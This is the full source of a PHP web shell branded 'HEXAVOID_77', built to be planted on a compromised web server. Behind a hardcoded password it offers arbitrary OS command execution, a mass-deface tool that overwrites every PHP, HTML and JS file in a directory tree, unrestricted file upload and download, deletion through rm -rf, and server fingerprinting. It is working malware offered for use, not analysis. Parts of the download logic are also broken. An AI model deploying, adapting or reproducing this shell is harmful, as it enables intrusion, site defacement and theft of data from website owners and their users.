<?php
/**
 * HEXAVOID_77 WEB SHELL
 * Dark Web Management System
 * Customized for HexaVoid_77
 * 
 * Features: Mass Deface, Command Execution, Login Protection, File Manager with Navigation, File Upload
 * Style: Dark HexaVoid_77 Theme
 */
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '256M');

// ==================== CONFIGURATION ====================
define('SHELL_PASSWORD', 'skuy'); // Ganti password ini
define('SHELL_VERSION', '3.1');
define('SHELL_NAME', 'HEXAVOID_77 WEB SHELL');
define('MAX_UPLOAD_SIZE', 100 * 1024 * 1024); // 100MB

// ==================== LOGIN SYSTEM ====================
session_start();
if (!isset($_SESSION['logged_in']) && !isset($_POST['login'])) {
    showLogin();
    exit;
}

if (isset($_POST['login'])) {
    if ($_POST['password'] === SHELL_PASSWORD) {
        $_SESSION['logged_in'] = true;
        $_SESSION['login_time'] = time();
    } else {
        die('Invalid password!');
    }
}

// ==================== SECURITY FUNCTIONS ====================
function sanitizeInput($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

function getBasePath($path) {
    $realpath = realpath($path);
    return $realpath ? $realpath : $path;
}

// ==================== FILE MANAGER FUNCTIONS ====================
function listDirectory($dir) {
    $files = [];
    if (!is_readable($dir)) {
        return ['error' => 'Directory not readable'];
    }
    
    $items = @scandir($dir);
    if ($items === false) {
        return ['error' => 'Failed to scan directory'];
    }
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($path);
        
        $files[] = [
            'name' => $item,
            'path' => $path,
            'is_dir' => $is_dir,
            'size' => $is_dir ? 0 : (@filesize($path) ?: 0),
            'formatted_size' => $is_dir ? 'DIR' : formatSize(@filesize($path) ?: 0),
            'permissions' => substr(sprintf('%o', @fileperms($path) ?: 0), -4),
            'modified' => date('Y-m-d H:i:s', @filemtime($path) ?: time()),
            'icon' => $is_dir ? '📁' : getFileIcon($item)
        ];
    }
    
    // Sort: directories first, then files
    usort($files, function($a, $b) {
        if ($a['is_dir'] && !$b['is_dir']) return -1;
        if (!$a['is_dir'] && $b['is_dir']) return 1;
        return strcasecmp($a['name'], $b['name']);
    });
    
    return $files;
}

function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => '🐘', 'html' => '🌐', 'htm' => '🌐', 'js' => '📜',
        'txt' => '📄', 'pdf' => '📕', 'doc' => '📘', 'docx' => '📘',
        'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️',
        'zip' => '📦', 'rar' => '📦', '7z' => '📦', 'tar' => '📦',
        'mp3' => '🎵', 'wav' => '🎵', 'mp4' => '🎬', 'avi' => '🎬',
        'sql' => '🗄️', 'db' => '🗄️', 'json' => '📋', 'xml' => '📋'
    ];
    
    return $icons[$ext] ?? '📄';
}

function formatSize($bytes) {
    if ($bytes == 0) return '0 Bytes';
    $k = 1024;
    $sizes = ['Bytes', 'KB', 'MB', 'GB'];
    $i = floor(log($bytes) / log($k));
    return round($bytes / pow($k, $i), 2) . ' ' . $sizes[$i];
}

function handleFileUpload($file, $targetDir) {
    if ($file['error'] !== UPLOAD_ERR_OK) {
        return ['status' => 'error', 'message' => 'Upload error: ' . $file['error']];
    }
    
    if ($file['size'] > MAX_UPLOAD_SIZE) {
        return ['status' => 'error', 'message' => 'File too large'];
    }
    
    $filename = sanitizeInput(basename($file['name']));
    $targetPath = $targetDir . DIRECTORY_SEPARATOR . $filename;
    
    // Prevent overwriting
    if (file_exists($targetPath)) {
        $info = pathinfo($filename);
        $filename = $info['filename'] . '_' . time() . '.' . $info['extension'];
        $targetPath = $targetDir . DIRECTORY_SEPARATOR . $filename;
    }
    
    if (move_uploaded_file($file['tmp_name'], $targetPath)) {
        return [
            'status' => 'success', 
            'message' => 'File uploaded successfully',
            'filename' => $filename,
            'path' => $targetPath
        ];
    } else {
        return ['status' => 'error', 'message' => 'Failed to move uploaded file'];
    }
}

// ==================== MASS DEFACE FUNCTIONS ====================
function massDeface($defaceCode, $directory = '.') {
    $results = [
        'success' => 0,
        'failed' => 0,
        'files' => []
    ];
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    $fileTypes = ['php', 'html', 'htm', 'txt', 'js'];
    
    foreach ($iterator as $file) {
        if ($file->isFile() && in_array(strtolower($file->getExtension()), $fileTypes)) {
            $filePath = $file->getPathname();
            
            // Backup original file
            $backupPath = $filePath . '.hexabackup';
            if (!file_exists($backupPath)) {
                copy($filePath, $backupPath);
            }
            
            if (file_put_contents($filePath, $defaceCode) !== false) {
                $results['success']++;
                $results['files'][] = [
                    'path' => $filePath,
                    'status' => 'success',
                    'size' => filesize($filePath)
                ];
            } else {
                $results['failed']++;
                $results['files'][] = [
                    'path' => $filePath,
                    'status' => 'failed'
                ];
            }
        }
    }
    
    return $results;
}

function restoreBackup($directory = '.') {
    $results = [
        'restored' => 0,
        'failed' => 0
    ];
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $file) {
        if ($file->isFile() && strpos($file->getFilename(), '.hexabackup') !== false) {
            $backupPath = $file->getPathname();
            $originalPath = str_replace('.hexabackup', '', $backupPath);
            
            if (copy($backupPath, $originalPath)) {
                unlink($backupPath);
                $results['restored']++;
            } else {
                $results['failed']++;
            }
        }
    }
    
    return $results;
}

// ==================== COMMAND EXECUTION ====================
function executeCommand($command) {
    $output = [];
    $returnCode = 0;
    
    if (function_exists('exec')) {
        exec($command . ' 2>&1', $output, $returnCode);
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($command . ' 2>&1');
        $output = $output ? explode("\n", $output) : [];
    } elseif (function_exists('system')) {
        ob_start();
        system($command . ' 2>&1', $returnCode);
        $output = explode("\n", ob_get_clean());
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($command . ' 2>&1', $returnCode);
        $output = explode("\n", ob_get_clean());
    } else {
        $output = ['Command execution functions are disabled'];
    }
    
    return [
        'output' => $output,
        'return_code' => $returnCode,
        'working_dir' => getcwd()
    ];
}

// ==================== SYSTEM INFO ====================
function getSystemInfo() {
    return [
        'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'Unknown',
        'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
        'php_version' => PHP_VERSION,
        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'current_user' => get_current_user(),
        'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
        'disk_free' => disk_free_space('.') ? formatSize(disk_free_space('.')) : 'Unknown',
        'disk_total' => disk_total_space('.') ? formatSize(disk_total_space('.')) : 'Unknown',
        'memory_usage' => formatSize(memory_get_usage(true)),
        'memory_peak' => formatSize(memory_get_peak_usage(true))
    ];
}

// ==================== LOGIN PAGE ====================
function showLogin() {
    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HEXAVOID_77 - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: "Courier New", monospace;
            color: #00ff00;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-image: 
                radial-gradient(circle at 20% 80%, rgba(120, 0, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 0, 120, 0.1) 0%, transparent 50%);
        }
        .login-container {
            background: rgba(10, 10, 20, 0.9);
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 40px;
            width: 400px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
            position: relative;
            overflow: hidden;
        }
        .login-container::before {
            content: "";
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(0, 255, 0, 0.1), transparent);
            animation: shine 3s infinite;
        }
        @keyframes shine {
            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
            font-size: 24px;
            font-weight: bold;
            text-shadow: 0 0 10px #00ff00;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ff00;
            border-radius: 5px;
            color: #00ff00;
            font-family: "Courier New", monospace;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background: #00ff00;
            color: #000;
            border: none;
            border-radius: 5px;
            font-family: "Courier New", monospace;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .login-btn:hover {
            background: #00cc00;
            box-shadow: 0 0 15px #00ff00;
        }
        .hacker-text {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            opacity: 0.7;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">⚡ HEXAVOID_77 ⚡</div>
        <form method="POST">
            <div class="input-group">
                <label>PASSWORD:</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit" name="login" class="login-btn">ACCESS SYSTEM</button>
        </form>
        <div class="hacker-text">[ DARK WEB MANAGEMENT SYSTEM ]</div>
    </div>
</body>
</html>';
    exit;
}

// ==================== HANDLE ACTIONS ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    
    if (isset($_POST['action'])) {
        switch ($_POST['action']) {
            case 'mass_deface':
                $code = $_POST['deface_code'] ?? '';
                $dir = $_POST['directory'] ?? '.';
                $result = massDeface($code, $dir);
                echo json_encode($result);
                break;
                
            case 'restore_backup':
                $dir = $_POST['directory'] ?? '.';
                $result = restoreBackup($dir);
                echo json_encode($result);
                break;
                
            case 'execute_command':
                $command = $_POST['command'] ?? '';
                $result = executeCommand($command);
                echo json_encode($result);
                break;
                
            case 'file_upload':
                if (isset($_FILES['upload_file'])) {
                    $targetDir = $_POST['current_dir'] ?? '.';
                    $result = handleFileUpload($_FILES['upload_file'], $targetDir);
                    echo json_encode($result);
                }
                break;
                
            case 'logout':
                session_destroy();
                echo json_encode(['status' => 'success']);
                break;
        }
    }
    exit;
}

// ==================== MAIN INTERFACE ====================
$current_dir = isset($_GET['dir']) ? getBasePath($_GET['dir']) : getBasePath('.');
if (!is_dir($current_dir)) {
    $current_dir = getBasePath('.');
}

$files_data = listDirectory($current_dir);
$system_info = getSystemInfo();

// Breadcrumb navigation
$breadcrumbs = [];
$path = $current_dir;
while ($path !== dirname($path)) {
    $breadcrumbs[] = [
        'name' => basename($path) ?: $path,
        'path' => $path
    ];
    $path = dirname($path);
}
$breadcrumbs[] = ['name' => 'Root', 'path' => '/'];
$breadcrumbs = array_reverse($breadcrumbs);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HEXAVOID_77 WEB SHELL</title>
    <style>
        :root {
            --main-bg: #0a0a0a;
            --secondary-bg: #1a1a1a;
            --accent-color: #00ff00;
            --accent-glow: rgba(0, 255, 0, 0.3);
            --text-color: #00ff00;
            --danger-color: #ff0000;
            --warning-color: #ffff00;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: var(--main-bg);
            color: var(--text-color);
            font-family: 'Courier New', monospace;
            line-height: 1.6;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: var(--secondary-bg);
            border: 1px solid var(--accent-color);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 20px var(--accent-glow);
            position: relative;
            overflow: hidden;
        }
        
        .header::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--accent-color), transparent);
        }
        
        .shell-title {
            font-size: 28px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 10px;
            text-shadow: 0 0 10px var(--accent-color);
        }
        
        .user-info {
            text-align: center;
            font-size: 14px;
            opacity: 0.8;
            margin-bottom: 15px;
        }
        
        .system-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin-top: 15px;
        }
        
        .info-card {
            background: rgba(0, 0, 0, 0.5);
            padding: 10px;
            border: 1px solid var(--accent-color);
            border-radius: 5px;
            font-size: 12px;
        }
        
        .tabs {
            display: flex;
            gap: 5px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .tab {
            background: var(--secondary-bg);
            border: 1px solid var(--accent-color);
            color: var(--text-color);
            padding: 12px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s;
        }
        
        .tab:hover {
            background: var(--accent-color);
            color: var(--main-bg);
        }
        
        .tab.active {
            background: var(--accent-color);
            color: var(--main-bg);
        }
        
        .tab-content {
            display: none;
            background: var(--secondary-bg);
            border: 1px solid var(--accent-color);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        
        .form-control {
            width: 100%;
            padding: 10px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid var(--accent-color);
            border-radius: 5px;
            color: var(--text-color);
            font-family: 'Courier New', monospace;
        }
        
        textarea.form-control {
            min-height: 150px;
            resize: vertical;
        }
        
        .btn {
            background: var(--accent-color);
            color: var(--main-bg);
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-block;
        }
        
        .btn:hover {
            box-shadow: 0 0 15px var(--accent-glow);
        }
        
        .btn-danger {
            background: var(--danger-color);
        }
        
        .btn-warning {
            background: var(--warning-color);
            color: #000;
        }
        
        .btn-sm {
            padding: 5px 10px;
            font-size: 12px;
        }
        
        .file-manager-container {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid var(--accent-color);
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 15px;
        }
        
        .breadcrumb {
            margin-bottom: 15px;
            padding: 10px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 5px;
            border: 1px solid var(--accent-color);
        }
        
        .breadcrumb a {
            color: var(--accent-color);
            text-decoration: none;
        }
        
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        
        .file-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        
        .file-table th,
        .file-table td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid var(--accent-color);
        }
        
        .file-table th {
            background: rgba(0, 255, 0, 0.1);
        }
        
        .file-table tr:hover {
            background: rgba(0, 255, 0, 0.05);
        }
        
        .file-link {
            color: var(--accent-color);
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .file-link:hover {
            text-decoration: underline;
        }
        
        .upload-area {
            border: 2px dashed var(--accent-color);
            border-radius: 5px;
            padding: 20px;
            text-align: center;
            margin: 15px 0;
            background: rgba(0, 0, 0, 0.3);
        }
        
        .result-box {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid var(--accent-color);
            border-radius: 5px;
            padding: 15px;
            margin-top: 15px;
            max-height: 400px;
            overflow-y: auto;
            font-size: 12px;
        }
        
        .command-output {
            background: #000;
            color: #0f0;
            padding: 10px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .status-success {
            color: #0f0;
        }
        
        .status-failed {
            color: #f00;
        }
        
        .status-warning {
            color: #ff0;
        }
        
        .glow-text {
            text-shadow: 0 0 10px currentColor;
        }
        
        .file-actions {
            display: flex;
            gap: 5px;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            background: var(--secondary-bg);
            border: 2px solid var(--accent-color);
            border-radius: 10px;
            padding: 20px;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 0 30px var(--accent-glow);
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="shell-title glow-text">⚡ HEXAVOID_77 WEB SHELL v3.1 ⚡</div>
            <div class="user-info">
                User: <?= $system_info['current_user'] ?> | 
                Client: <?= $system_info['client_ip'] ?> | 
                PHP: <?= $system_info['php_version'] ?>
            </div>
            <div class="system-grid">
                <div class="info-card">Server: <?= $system_info['server_software'] ?></div>
                <div class="info-card">Server IP: <?= $system_info['server_ip'] ?></div>
                <div class="info-card">Disk Free: <?= $system_info['disk_free'] ?></div>
                <div class="info-card">Memory: <?= $system_info['memory_usage'] ?></div>
            </div>
        </div>

        <!-- Tabs -->
        <div class="tabs">
            <div class="tab active" onclick="switchTab('file-manager')">📁 FILE MANAGER</div>
            <div class="tab" onclick="switchTab('mass-deface')">💀 MASS DEFACE</div>
            <div class="tab" onclick="switchTab('command-exec')">🖥️ COMMAND EXEC</div>
            <div class="tab" onclick="switchTab('system-info')">🔧 SYSTEM INFO</div>
            <div class="tab btn-danger" onclick="logout()">🚪 LOGOUT</div>
        </div>

        <!-- File Manager Tab -->
        <div id="file-manager" class="tab-content active">
            <h3>📁 FILE MANAGER</h3>
            
            <!-- Breadcrumb Navigation -->
            <div class="breadcrumb">
                📍 Location: 
                <?php foreach ($breadcrumbs as $index => $crumb): ?>
                    <a href="?dir=<?= urlencode($crumb['path']) ?>"><?= $crumb['name'] ?></a>
                    <?php if ($index < count($breadcrumbs) - 1): ?> / <?php endif; ?>
                <?php endforeach; ?>
            </div>

            <!-- File Upload -->
            <div class="upload-area">
                <h4>⬆️ UPLOAD FILE</h4>
                <form id="upload-form" enctype="multipart/form-data">
                    <input type="file" name="upload_file" id="upload-file" class="form-control" style="margin-bottom: 10px;">
                    <input type="hidden" name="current_dir" value="<?= $current_dir ?>">
                    <button type="button" class="btn" onclick="uploadFile()">🚀 UPLOAD FILE</button>
                </form>
                <div id="upload-result" style="margin-top: 10px;"></div>
            </div>

            <!-- File List -->
            <div class="file-manager-container">
                <?php if (isset($files_data['error'])): ?>
                    <div class="status-failed">Error: <?= $files_data['error'] ?></div>
                <?php else: ?>
                    <table class="file-table">
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th>Size</th>
                                <th>Permissions</th>
                                <th>Modified</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <!-- Parent Directory Link -->
                            <?php if ($current_dir !== '/' && dirname($current_dir) !== $current_dir): ?>
                            <tr>
                                <td>
                                    <a href="?dir=<?= urlencode(dirname($current_dir)) ?>" class="file-link">
                                        📁 ..
                                    </a>
                                </td>
                                <td>DIR</td>
                                <td>-</td>
                                <td>-</td>
                                <td>-</td>
                            </tr>
                            <?php endif; ?>

                            <!-- Files and Directories -->
                            <?php foreach ($files_data as $file): ?>
                            <tr>
                                <td>
                                    <?php if ($file['is_dir']): ?>
                                        <a href="?dir=<?= urlencode($file['path']) ?>" class="file-link">
                                            <?= $file['icon'] ?> <?= $file['name'] ?>
                                        </a>
                                    <?php else: ?>
                                        <span class="file-link">
                                            <?= $file['icon'] ?> <?= $file['name'] ?>
                                        </span>
                                    <?php endif; ?>
                                </td>
                                <td><?= $file['formatted_size'] ?></td>
                                <td><?= $file['permissions'] ?></td>
                                <td><?= $file['modified'] ?></td>
                                <td>
                                    <div class="file-actions">
                                        <?php if (!$file['is_dir']): ?>
                                            <button class="btn btn-sm btn-warning" onclick="downloadFile('<?= $file['path'] ?>', '<?= $file['name'] ?>')">📥</button>
                                        <?php endif; ?>
                                        <button class="btn btn-sm btn-danger" onclick="deleteItem('<?= $file['path'] ?>', '<?= $file['name'] ?>')">🗑️</button>
                                    </div>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                <?php endif; ?>
            </div>
        </div>

        <!-- Mass Deface Tab -->
        <div id="mass-deface" class="tab-content">
            <h3>💀 MASS DEFACE TOOL</h3>
            <div class="form-group">
                <label>Deface Code (HTML/PHP):</label>
                <textarea id="deface-code" class="form-control" placeholder="Enter your deface code here...">&lt;?php // HEXAVOID_77 WAS HERE ?&gt;</textarea>
            </div>
            <div class="form-group">
                <label>Target Directory:</label>
                <input type="text" id="target-dir" class="form-control" value="<?= $current_dir ?>" placeholder="Directory to deface">
            </div>
            <button class="btn" onclick="executeMassDeface()">💀 EXECUTE MASS DEFACE</button>
            <button class="btn btn-danger" onclick="restoreBackup()">🔄 RESTORE BACKUP</button>
            <div id="deface-results" class="result-box" style="display: none;"></div>
        </div>

        <!-- Command Execution Tab -->
        <div id="command-exec" class="tab-content">
            <h3>🖥️ COMMAND EXECUTION</h3>
            <div class="form-group">
                <label>Command:</label>
                <input type="text" id="command-input" class="form-control" placeholder="Enter system command..." value="ls -la">
            </div>
            <button class="btn" onclick="executeCommand()">⚡ EXECUTE COMMAND</button>
            <div id="command-results" class="result-box" style="display: none;">
                <div class="command-output" id="command-output"></div>
            </div>
        </div>

        <!-- System Info Tab -->
        <div id="system-info" class="tab-content">
            <h3>🔧 SYSTEM INFORMATION</h3>
            <div class="result-box">
                <pre><?php 
                    foreach ($system_info as $key => $value) {
                        echo str_pad($key, 15) . " : $value\n";
                    }
                    
                    // Additional PHP info
                    echo "\nPHP Functions:\n";
                    $functions = ['exec', 'shell_exec', 'system', 'passthru', 'file_get_contents', 'file_put_contents'];
                    foreach ($functions as $func) {
                        $status = function_exists($func) ? 'ENABLED' : 'DISABLED';
                        echo str_pad($func, 20) . " : $status\n";
                    }
                ?></pre>
            </div>
        </div>
    </div>

    <!-- Upload Modal -->
    <div id="upload-modal" class="modal">
        <div class="modal-content">
            <h3>⬆️ Uploading File...</h3>
            <div class="progress-bar" style="width: 100%; height: 20px; background: #000; border: 1px solid #0f0; margin: 10px 0;">
                <div id="upload-progress" style="width: 0%; height: 100%; background: #0f0; transition: width 0.3s;"></div>
            </div>
            <div id="upload-status">Initializing...</div>
        </div>
    </div>

    <script>
        function switchTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Remove active class from all tab buttons
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }

        function uploadFile() {
            const fileInput = document.getElementById('upload-file');
            const form = document.getElementById('upload-form');
            const resultDiv = document.getElementById('upload-result');
            
            if (!fileInput.files[0]) {
                resultDiv.innerHTML = '<div class="status-warning">Please select a file to upload</div>';
                return;
            }
            
            const formData = new FormData(form);
            formData.append('action', 'file_upload');
            
            // Show upload modal
            const modal = document.getElementById('upload-modal');
            const progressBar = document.getElementById('upload-progress');
            const statusText = document.getElementById('upload-status');
            modal.classList.add('active');
            
            const xhr = new XMLHttpRequest();
            
            xhr.upload.addEventListener('progress', function(e) {
                if (e.lengthComputable) {
                    const percent = (e.loaded / e.total) * 100;
                    progressBar.style.width = percent + '%';
                    statusText.textContent = `Uploading: ${Math.round(percent)}%`;
                }
            });
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    modal.classList.remove('active');
                    
                    try {
                        const response = JSON.parse(xhr.responseText);
                        if (response.status === 'success') {
                            resultDiv.innerHTML = `<div class="status-success">✅ ${response.message} - ${response.filename}</div>`;
                            // Reload file list after 1 second
                            setTimeout(() => {
                                window.location.reload();
                            }, 1000);
                        } else {
                            resultDiv.innerHTML = `<div class="status-failed">❌ ${response.message}</div>`;
                        }
                    } catch (e) {
                        resultDiv.innerHTML = '<div class="status-failed">❌ Upload failed</div>';
                    }
                }
            };
            
            xhr.open('POST', '');
            xhr.send(formData);
        }

        function executeMassDeface() {
            const code = document.getElementById('deface-code').value;
            const dir = document.getElementById('target-dir').value;
            
            if (!code) {
                alert('Please enter deface code!');
                return;
            }
            
            const formData = new FormData();
            formData.append('action', 'mass_deface');
            formData.append('deface_code', code);
            formData.append('directory', dir);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                const resultsDiv = document.getElementById('deface-results');
                let html = `<h4>Deface Results:</h4>`;
                html += `<p class="status-success">✅ Success: ${data.success} files</p>`;
                html += `<p class="status-failed">❌ Failed: ${data.failed} files</p>`;
                
                if (data.files && data.files.length > 0) {
                    html += `<h5>File Details:</h5>`;
                    data.files.slice(0, 10).forEach(file => {
                        const statusClass = file.status === 'success' ? 'status-success' : 'status-failed';
                        html += `<p class="${statusClass}">${file.path} - ${file.status}</p>`;
                    });
                    if (data.files.length > 10) {
                        html += `<p class="status-warning">... and ${data.files.length - 10} more files</p>`;
                    }
                }
                
                resultsDiv.innerHTML = html;
                resultsDiv.style.display = 'block';
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }

        function restoreBackup() {
            const dir = document.getElementById('target-dir').value;
            
            const formData = new FormData();
            formData.append('action', 'restore_backup');
            formData.append('directory', dir);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                const resultsDiv = document.getElementById('deface-results');
                let html = `<h4>Restore Results:</h4>`;
                html += `<p class="status-success">✅ Restored: ${data.restored} files</p>`;
                html += `<p class="status-failed">❌ Failed: ${data.failed} files</p>`;
                
                resultsDiv.innerHTML = html;
                resultsDiv.style.display = 'block';
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }

        function executeCommand() {
            const command = document.getElementById('command-input').value;
            
            if (!command) {
                alert('Please enter a command!');
                return;
            }
            
            const formData = new FormData();
            formData.append('action', 'execute_command');
            formData.append('command', command);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                const outputDiv = document.getElementById('command-output');
                const resultsDiv = document.getElementById('command-results');
                
                let output = '';
                if (Array.isArray(data.output)) {
                    output = data.output.join('\n');
                } else {
                    output = String(data.output);
                }
                
                outputDiv.textContent = output || 'No output';
                resultsDiv.style.display = 'block';
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }

        function downloadFile(filepath, filename) {
            // Create a temporary link to download the file
            const link = document.createElement('a');
            link.href = '?download=' + encodeURIComponent(filepath);
            link.download = filename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        function deleteItem(filepath, filename) {
            if (confirm(`Are you sure you want to delete "${filename}"?`)) {
                // For security, we'll implement this via command execution
                const command = `rm -rf "${filepath}"`;
                const formData = new FormData();
                formData.append('action', 'execute_command');
                formData.append('command', command);
                
                fetch('', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (data.return_code === 0) {
                        alert('File deleted successfully!');
                        window.location.reload();
                    } else {
                        alert('Failed to delete file: ' + data.output.join('\n'));
                    }
                });
            }
        }

        function logout() {
            if (confirm('Are you sure you want to logout?')) {
                const formData = new FormData();
                formData.append('action', 'logout');
                
                fetch('', {
                    method: 'POST',
                    body: formData
                })
                .then(() => {
                    window.location.reload();
                });
            }
        }

        // Handle file downloads via URL parameter
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has('download')) {
            const filepath = urlParams.get('download');
            window.location.href = 'file://' + filepath;
        }

        // Add some hacker-like effects
        document.addEventListener('DOMContentLoaded', function() {
            // Matrix-like background effect
            const style = document.createElement('style');
            style.textContent = `
                body::before {
                    content: "";
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: 
                        linear-gradient(90deg, transparent 95%, rgba(0, 255, 0, 0.03) 100%),
                        linear-gradient(transparent 95%, rgba(0, 255, 0, 0.03) 100%);
                    background-size: 50px 50px;
                    pointer-events: none;
                    z-index: -1;
                }
            `;
            document.head.appendChild(style);
        });
    </script>
</body>
</html>
<?php
// Handle file downloads
if (isset($_GET['download'])) {
    $filepath = getBasePath($_GET['download']);
    if (file_exists($filepath) && is_file($filepath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
        header('Content-Length: ' . filesize($filepath));
        readfile($filepath);
        exit;
    }
}
?>